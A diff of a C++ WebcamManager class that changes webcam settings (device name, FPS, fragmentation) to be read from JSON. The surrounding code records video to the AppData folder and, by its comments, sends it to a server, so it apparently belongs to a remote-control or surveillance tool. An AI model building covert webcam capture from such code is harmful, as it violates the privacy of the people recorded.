@@ -1,13 +1,18 @@
 #include "WebcamManager.h"
 
+#include <utility>
+
 
 // constructor -> information of recording and socket
 WebcamManager::WebcamManager(const Stream &stream)
         : Sender(stream) {
-    std::string webcamName = stream.readString();
+}
+
+void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
+    std::string webcamName = jsonObject["selected_device"];
     webcamID = DeviceEnumerator::getIndexOfWebcamByName(webcamName);
-    fragmented = stream.readSize();
-    FPS = stream.readSize();
+    fragmented = jsonObject["is_fragmented"];
+    FPS = jsonObject["fps"];
 #ifdef WEBCAM
     locationOfVideos = Converter::string2wstring(WEBCAM);
     fileName = Install::getAppDataPath() +L"\\" + this->locationOfVideos + L"\\" +( fragmented ? L"fragmented_video_" : L"one_take_video_");
@@ -59,7 +64,8 @@ void WebcamManager::send() {
 }
 
 // starting webcam, sending information to server
-void WebcamManager::startWebcam() {
+void WebcamManager::startWebcam(nlohmann::json jsonObject) {
+    setConfiguration(std::move(jsonObject));
     cv::Mat frame;
     cv::VideoCapture vid(webcamID);
 
@@ -126,4 +132,6 @@ void WebcamManager::startWebcam() {
     }
     vid.release(); // release video
 }
+
+
 
